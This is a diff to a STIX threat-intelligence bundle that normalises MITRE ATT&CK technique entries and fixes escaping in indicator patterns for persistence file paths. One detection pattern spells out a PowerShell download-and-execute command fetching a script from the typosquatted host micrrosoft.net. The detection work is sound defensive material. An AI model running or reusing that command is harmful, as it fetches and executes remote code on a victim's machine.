@@ -37,7 +37,7 @@
       "kill_chain_phases": [
         {
           "kill_chain_name": "mitre-attack",
-          "phase_name": "Discovery"
+          "phase_name": "discovery"
         },
         {
           "kill_chain_name": "lockheed",
@@ -66,7 +66,7 @@
       "kill_chain_phases": [
         {
           "kill_chain_name": "mitre-attack",
-          "phase_name": "Collection"
+          "phase_name": "collection"
         },
         {
           "kill_chain_name": "lockheed",
@@ -95,7 +95,7 @@
       "kill_chain_phases": [
         {
           "kill_chain_name": "mitre-attack",
-          "phase_name": "discovery "
+          "phase_name": "discovery"
         },
         {
           "kill_chain_name": "lockheed",
@@ -104,7 +104,7 @@
       ],
       "external_references": [
         {
-          "source_name": "mitre-attack ",
+          "source_name": "mitre-attack",
           "url": "https://attack.mitre.org/wiki/Technique/T1033",
           "external_id": "T1033"
         }
@@ -149,7 +149,7 @@
       "created": "2018-05-31T15:34:02.742Z",
       "modified": "2018-07-26T15:39:24.779Z",
       "name": "Process Discovery",
-      "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network.\\n\\n===Windows===\\n\\nAn example command that would obtain details on processes is \\\"tasklist\\\" using the Tasklist utility.\\n\\n===Mac and Linux===\\n\\nIn Mac and Linux, this is accomplished with the <code>ps</code> command.\\n\\nDetection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Windows Management Instrumentation and PowerShell.\\n\\nPlatforms: Windows Server 2003, Windows Server 2008, Windows Server 2012, Windows XP, Windows 7, Windows 8, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012 R2, Windows Vista, Windows 8.1, Linux, Windows 10, MacOS, OS X\\n\\nData Sources: Process monitoring, Process command-line parameters\n",
+      "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network.\n\n===Windows===\n\nAn example command that would obtain details on processes is \\\"tasklist\\\" using the Tasklist utility.\n\n===Mac and Linux===\n\nIn Mac and Linux, this is accomplished with the <code>ps</code> command.\n\nDetection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Windows Management Instrumentation and PowerShell.\n\nPlatforms: Windows Server 2003, Windows Server 2008, Windows Server 2012, Windows XP, Windows 7, Windows 8, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012 R2, Windows Vista, Windows 8.1, Linux, Windows 10, MacOS, OS X\n\nData Sources: Process monitoring, Process command-line parameters\n",
       "kill_chain_phases": [
         {
           "kill_chain_name": "mitre-attack",
@@ -236,7 +236,7 @@
       "created": "2018-05-31T15:49:02.358Z",
       "modified": "2018-06-20T14:17:36.903Z",
       "name": "Remote File Copy",
-      "description": "Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\\n\\nAdversaries may also copy files laterally between internal victim systems to support Windows Admin Shares or Remote Desktop Protocol.\\n\\nDetection: Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\\n\\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[Citation: University of Birmingham C2]]\\n\\nPlatforms: Windows Server 2003, Windows Server 2008, Windows Server 2012, Windows XP, Windows 7, Windows 8, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012 R2, Windows Vista, Windows 8.1, Windows 10, Linux, MacOS, OS X\\n\\nData Sources: File monitoring, Packet capture, Process use of network, Netflow/Enclave netflow, Network protocol analysis, Process monitoring\n",
+      "description": "Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\n\nAdversaries may also copy files laterally between internal victim systems to support Windows Admin Shares or Remote Desktop Protocol.\n\nDetection: Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[Citation: University of Birmingham C2]]\n\nPlatforms: Windows Server 2003, Windows Server 2008, Windows Server 2012, Windows XP, Windows 7, Windows 8, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012 R2, Windows Vista, Windows 8.1, Windows 10, Linux, MacOS, OS X\n\nData Sources: File monitoring, Packet capture, Process use of network, Netflow/Enclave netflow, Network protocol analysis, Process monitoring\n",
       "kill_chain_phases": [
         {
           "kill_chain_name": "mitre-attack",
@@ -278,7 +278,7 @@
       "kill_chain_phases": [
         {
           "kill_chain_name": "mitre-attack",
-          "phase_name": "Persistence"
+          "phase_name": "persistence"
         },
         {
           "kill_chain_name": "lockheed",
@@ -303,7 +303,7 @@
       "created": "2018-05-31T15:32:59.891Z",
       "modified": "2018-06-20T13:17:31.681Z",
       "name": "Custom Command and Control Protocol",
-      "description": "Adversaries may communicate using a custom command and control protocol instead of using existing Standard Application Layer Protocol to encapsulate commands. Implementations could mimic well-known protocols.\\n\\nDetection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[Citation: University of Birmingham C2]]\\n\\nPlatforms: Windows Server 2003, Windows Server 2008, Windows Server 2012, Windows XP, Windows 7, Windows 8, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012 R2, Windows Vista, Windows 8.1, Linux, Windows 10, MacOS, OS X\\n\\nData Sources: Packet capture, Netflow/Enclave netflow, Process use of network, Process monitoring\n",
+      "description": "Adversaries may communicate using a custom command and control protocol instead of using existing Standard Application Layer Protocol to encapsulate commands. Implementations could mimic well-known protocols.\n\nDetection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[Citation: University of Birmingham C2]]\n\nPlatforms: Windows Server 2003, Windows Server 2008, Windows Server 2012, Windows XP, Windows 7, Windows 8, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012 R2, Windows Vista, Windows 8.1, Linux, Windows 10, MacOS, OS X\n\nData Sources: Packet capture, Netflow/Enclave netflow, Process use of network, Process monitoring\n",
       "kill_chain_phases": [
         {
           "kill_chain_name": "mitre-attack",
@@ -337,7 +337,7 @@
       "created": "2018-05-31T15:36:45.223Z",
       "modified": "2018-06-20T13:45:30.188Z",
       "name": "Obfuscated Files or Information",
-      "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system.\\n\\nDetection: Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).\\n\\nPlatforms: Windows Server 2003, Windows Server 2008, Windows Server 2012, Windows XP, Windows 7, Windows 8, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012 R2, Windows Vista, Windows 8.1, Windows 10\\n\\nData Sources: Network protocol analysis, Process use of network, File monitoring, Malware reverse engineering, Binary file metadata\n",
+      "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system.\n\nDetection: Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system).\n\nPlatforms: Windows Server 2003, Windows Server 2008, Windows Server 2012, Windows XP, Windows 7, Windows 8, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012 R2, Windows Vista, Windows 8.1, Windows 10\n\nData Sources: Network protocol analysis, Process use of network, File monitoring, Malware reverse engineering, Binary file metadata\n",
       "kill_chain_phases": [
         {
           "kill_chain_name": "mitre-attack",
@@ -370,7 +370,7 @@
       "kill_chain_phases": [
         {
           "kill_chain_name": "mitre-attack",
-          "phase_name": "Execution"
+          "phase_name": "execution"
         },
         {
           "kill_chain_name": "lockheed",
@@ -487,7 +487,7 @@
       "created": "2018-05-31T15:35:38.939Z",
       "modified": "2018-06-20T13:30:48.805Z",
       "name": "Command-Line Interface",
-      "description": "Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms.cmd, which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. Scheduled Task).\\n\\nAdversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.\\n\\nDetection: Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.\\n\\nPlatforms: Windows Server 2003, Windows Server 2008, Windows Server 2012, Windows XP, Windows 7, Windows 8, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012 R2, Windows Vista, Windows 8.1, Linux, Windows 10, MacOS, OS X\\n\\nData Sources: Process monitoring, Process command-line parameters\n",
+      "description": "Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms.cmd, which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. Scheduled Task).\n\nAdversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.\n\nDetection: Command-line interface activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools.\n\nPlatforms: Windows Server 2003, Windows Server 2008, Windows Server 2012, Windows XP, Windows 7, Windows 8, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012 R2, Windows Vista, Windows 8.1, Linux, Windows 10, MacOS, OS X\n\nData Sources: Process monitoring, Process command-line parameters\n",
       "kill_chain_phases": [
         {
           "kill_chain_name": "mitre-attack",
@@ -616,7 +616,7 @@
       "created": "2018-07-31T16:42:06.206Z",
       "modified": "2018-07-31T16:51:37.845Z",
       "name": "USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnk",
-      "pattern": "[directory:path = 'USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnk']",
+      "pattern": "[directory:path = 'USERNAME\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\OneDrive.lnk']",
       "valid_from": "2018-07-31T16:42:06.206Z",
       "labels": [
         "malicious-activity"
@@ -772,7 +772,7 @@
       "created": "2018-07-30T20:39:27.891Z",
       "modified": "2018-07-31T19:32:39.299Z",
       "name": "Excel Formula that runs a command prompt",
-      "pattern": "[process:command_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -exec bypass -c IEX ((New-Object Net.WebClient).DownloadString(\\\"http://micrrosoft.net/winupdate.ps1\\\"))']",
+      "pattern": "[process:command_line = 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -exec bypass -c IEX ((New-Object Net.WebClient).DownloadString(\"http://micrrosoft.net/winupdate.ps1\"))']",
       "valid_from": "2018-07-30T20:39:27.891Z",
       "labels": [
         "malicious-activity"
@@ -820,7 +820,7 @@
       "created": "2018-07-31T18:08:12.370Z",
       "modified": "2018-07-31T19:05:32.944Z",
       "name": "%APPDATA%\\OneDrive.bat",
-      "pattern": "[directory:path = '%APPDATA%\\OneDrive.bat']",
+      "pattern": "[directory:path = '%APPDATA%\\\\OneDrive.bat']",
       "valid_from": "2018-07-31T18:08:12.370Z",
       "labels": [
         "malicious-activity"
@@ -916,7 +916,7 @@
       "created": "2018-07-31T18:11:25.090Z",
       "modified": "2018-07-31T19:05:32.944Z",
       "name": "%APPDATA%\\OneDrive.ps1",
-      "pattern": "[directory:path = '%APPDATA%\\OneDrive.ps1']",
+      "pattern": "[directory:path = '%APPDATA%\\\\OneDrive.ps1']",
       "valid_from": "2018-07-31T18:11:25.090Z",
       "labels": [
         "malicious-activity"
